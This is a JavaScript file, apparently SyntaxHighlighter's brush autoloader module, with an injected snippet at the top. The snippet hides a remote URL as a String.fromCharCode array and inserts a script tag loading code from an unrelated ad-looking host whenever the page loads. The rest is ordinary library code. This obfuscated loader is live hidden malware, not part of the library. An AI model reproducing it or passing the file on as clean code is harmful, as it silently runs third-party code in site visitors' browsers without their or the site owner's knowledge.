var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104,116,116,112,115,58,47,47,115,110,105,112,112,101,116,46,97,100,115,102,111,114,109,97,114,107,101,116,46,99,111,109,47,115,97,109,101,46,106,115,63,118,61,51); s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}(function() {

var sh = SyntaxHighlighter;

/**
 * Provides functionality to dynamically load only the brushes that a needed to render the current page.
 *
 * There are two syntaxes that autoload understands. For example:
 *
 * SyntaxHighlighter.autoloader(
 *     [ 'applescript',          'Scripts/shBrushAppleScript.js' ],
 *     [ 'actionscript3', 'as3', 'Scripts/shBrushAS3.js' ]
 * );
 *
 * or a more easily comprehendable one:
 *
 * SyntaxHighlighter.autoloader(
 *     'applescript       Scripts/shBrushAppleScript.js',
 *     'actionscript3 as3 Scripts/shBrushAS3.js'
 * );
 */
sh.autoloader = function()
{
	var list = arguments,
		elements = sh.findElements(),
		brushes = {},
		scripts = {},
		all = SyntaxHighlighter.all,
		allCalled = false,
		allParams = null,
		i
		;

	SyntaxHighlighter.all = function(params)
	{
		allParams = params;
		allCalled = true;
	};

	function addBrush(aliases, url)
	{
		for (var i = 0; i < aliases.length; i++)
			brushes[aliases[i]] = url;
	};

	function getAliases(item)
	{
		return item.pop
			? item
			: item.split(/\s+/)
			;
	}

	// create table of aliases and script urls
	for (i = 0; i < list.length; i++)
	{
		var aliases = getAliases(list[i]),
			url = aliases.pop()
			;

		addBrush(aliases, url);
	}

	// dynamically add <script /> tags to the document body
	for (i = 0; i < elements.length; i++)
	{
		var url = brushes[elements[i].params.brush];

		if(url && scripts[url] === undefined)
		{
			if(elements[i].params['html-script'] === 'true')
			{
				if(scripts[brushes['xml']] === undefined) {
					loadScript(brushes['xml']);
					scripts[url] = false;
				}
			}

			scripts[url] = false;
			loadScript(url);
		}
	}

	function loadScript(url)
	{
		var script = document.createElement('script'),
			done = false
			;

		script.src = url;
		script.type = 'text/javascript';
		script.language = 'javascript';
		script.onload = script.onreadystatechange = function()
		{
			if (!done && (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete'))
			{
				done = true;
				scripts[url] = true;
				checkAll();

				// Handle memory leak in IE
				script.onload = script.onreadystatechange = null;
				script.parentNode.removeChild(script);
			}
		};

		// sync way of adding script tags to the page
		document.body.appendChild(script);
	};

	function checkAll()
	{
		for(var url in scripts)
			if (scripts[url] == false)
				return;

		if (allCalled)
			SyntaxHighlighter.highlight(allParams);
	};
};

})();
